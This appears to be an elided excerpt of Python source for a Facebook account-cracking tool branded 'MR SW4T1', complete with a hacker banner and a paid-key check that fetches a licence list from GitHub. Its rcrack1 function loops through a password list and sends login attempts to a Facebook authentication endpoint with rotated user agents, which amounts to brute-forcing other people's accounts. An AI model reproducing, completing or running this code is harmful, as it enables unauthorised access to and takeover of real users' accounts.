...
def uaku():
	try:
		...
		a=requests.get('https://github.com/MR-SW4T1/SW4Tl/blob/main/Paid.txt').text
		ua=open('.bbnew.txt','w')
...
--------------------------------------------------
\033[1;32m[🔥]K1NGX MR SW4T1
\033[1;32m[🔥]F33L M33 H4T3RS
\033[1;32m[🔥] VERSION 1.3.3
--------------------------------------------------""")
def linex():
	print('\033[1;32m----------------------------------------------')
def clear():
...
def rcrack1(ids,passlist):
	...
	try:
		for pas in passlist:
            ...
            'user-agent': pro}
			url = 'https://free.facebook.com/method/auth.login'
...
def menu_apikey():
  ...
  id = "_".join(uuid)
  server = requests.get('https://github.com/MR-SW4T1/SW4Tl/blob/main/Paid.txt').text
...
==================================================   """)
  ...
  try:
    httpCaht = requests.get("https://github.com/MR-SW4T1/SW4Tl/blob/main/Paid.txt").text
    if id in httpCaht:
...
def tnx():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "_".join(uuid)
  server = requests.get('https://github.com/MR-SW4T1/P41D/blob/main/P41D.txt').text
